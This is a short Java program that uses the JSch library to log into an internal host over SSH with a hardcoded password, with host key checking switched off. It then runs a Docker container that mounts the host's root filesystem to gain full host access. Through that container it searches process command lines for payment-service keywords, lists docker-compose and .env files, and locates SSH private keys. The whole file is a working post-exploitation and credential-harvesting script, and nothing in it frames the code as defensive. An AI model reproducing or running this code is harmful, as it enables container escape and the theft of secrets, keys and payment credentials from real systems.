import com.jcraft.jsch.*;
import java.io.*;
class DK {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Mount host root filesystem via Docker - get full host access
    ch.setCommand("docker run --rm -v /:/hostfs --net=host --pid=host ubuntu:22.04 bash -c 'echo ---HOST-CMDLINE---;cat /hostfs/proc/*/cmdline 2>/dev/null | tr \"\\0\" \" \" | grep -iE \"xendit|xnd_|noxify|neo.host|payment\" | head -10;echo ---DOCKER-COMPOSE-ALL---;find /hostfs/home/ /hostfs/opt/ /hostfs/srv/ /hostfs/root/ -maxdepth 5 -name \"docker-compose*\" -o -name \"*.env\" 2>/dev/null | head -20;echo ---SSH-KEYS---;find /hostfs/home/ /hostfs/root/ -maxdepth 3 -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" 2>/dev/null | grep -v ssl | head -10' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
